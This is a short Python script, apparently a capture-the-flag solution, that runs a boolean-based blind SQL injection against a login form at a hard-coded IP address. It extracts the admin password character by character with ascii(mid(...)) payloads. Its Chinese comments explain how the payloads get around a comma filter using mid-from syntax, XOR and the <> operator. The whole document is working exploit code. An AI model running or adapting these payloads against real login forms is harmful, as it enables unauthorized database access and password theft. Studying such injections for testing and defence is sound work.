import requests
import string, hashlib

url = 'http://114.67.246.176:18030/'
sss = string.digits + (string.ascii_lowercase)
a = ''
for i in range(1, 50):
    flag = 0
    for j in sss:
        payload = "admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#" % (i, ord(j))
        # 屏蔽了","，改用mid()函数，from表示起始位置
        # ascii()当传入一个字符串时取出第一个字母的ascii()，相当于mid()的第二参数，for取出，也相当于limit
        # <>表示不等号
        # ^表示异或
        payload2 = "admin123'or((ascii(mid((select(password)from(admin))from(%s))))<>%s)#" % (i, ord(j))
        # 由于没有屏蔽or，所以也可以用这个，可以形成一组布尔
        payload3 = "admin123'or((ascii(mid((select(database()))from(%s))))<>%s)#" % (i, ord(j))

        data = {'username': payload, 'password': 'admin'}
        res = requests.post(url, data=data).text
        if 'username does not exist!' in res:
            a += j
            flag = 1
            print(a)
            break
    if flag == 0:
        break

print(a)
